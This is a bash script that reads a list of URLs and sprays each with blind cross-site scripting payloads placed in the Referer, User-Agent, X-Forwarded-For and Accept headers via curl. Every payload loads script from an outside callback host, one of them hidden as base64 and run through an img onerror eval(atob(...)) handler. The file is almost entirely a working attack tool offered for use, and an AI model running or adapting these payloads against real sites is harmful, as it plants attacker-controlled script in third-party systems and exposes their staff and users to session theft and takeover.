#!/bin/bash

# Flag to determine verbosity
verbose=false

# Function to display usage information
display_usage() {
    echo "Usage: $0 [-v] <urls_file>"
    echo "Options:"
    echo "  -v  Show verbose output for each request and payload"
}

# Array of values to be fuzz-tested
referer_values=('"><script src="https://js.rip/rt17z79c41"></script>' '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3J0MTd6NzljNDEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>')
user_agent_values=('"><script src="https://js.rip/rt17z79c41"></script>' '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3J0MTd6NzljNDEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>')
x_forwarded_for_values=('"><script src="https://js.rip/rt17z79c41"></script>' '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3J0MTd6NzljNDEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>')
accept_values=('"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL3J0MTd6NzljNDEiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>' '"><script src="https://js.rip/rt17z79c41"></script>')

# Function to perform fuzz testing on given URL
perform_fuzz_test() {
    url=$1

    for referer in "${referer_values[@]}"; do
        for user_agent in "${user_agent_values[@]}"; do
            for x_forwarded_for in "${x_forwarded_for_values[@]}"; do
                for accept in "${accept_values[@]}"; do
                    echo "Fuzz testing $url with Referer: $referer, User-agent: $user_agent, X-forwarded-for: $x_forwarded_for, Accept: $accept"
                    if [ "$verbose" = true ]; then
                        echo "Sending request:"
                        echo "curl -X GET -H \"Referer: $referer\" -H \"User-agent: $user_agent\" -H \"X-forwarded-for: $x_forwarded_for\" -H \"Accept: $accept\" \"$url\""
                        echo "Response:"
                    fi
                    curl_output=$(curl -s -X GET -H "Referer: $referer" -H "User-agent: $user_agent" -H "X-forwarded-for: $x_forwarded_for" -H "Accept: $accept" "$url")
                    echo "$curl_output"
                    echo -e "\n---------------------------------------------------------\n"
                done
            done
        done
    done
}

# Check for options
while getopts "v" opt; do
    case $opt in
        v) verbose=true ;;
        *) display_usage; exit 1 ;;
    esac
done

# Shift options to process remaining arguments
shift "$((OPTIND - 1))"

# Check if the required argument (urls_file) is provided
if [ $# -ne 1 ]; then
    display_usage
    exit 1
fi

urls_file=$1

# Check if the provided file exists
if [ ! -f "$urls_file" ]; then
    echo "Error: File '$urls_file' not found."
    exit 1
fi

# Read URLs from the file and perform fuzz testing on each URL
while IFS= read -r line; do
    url=$(echo "$line" | tr -d '\r\n')
    echo "Performing fuzz testing on URL: $url"
    perform_fuzz_test "$url"
done < "$urls_file"
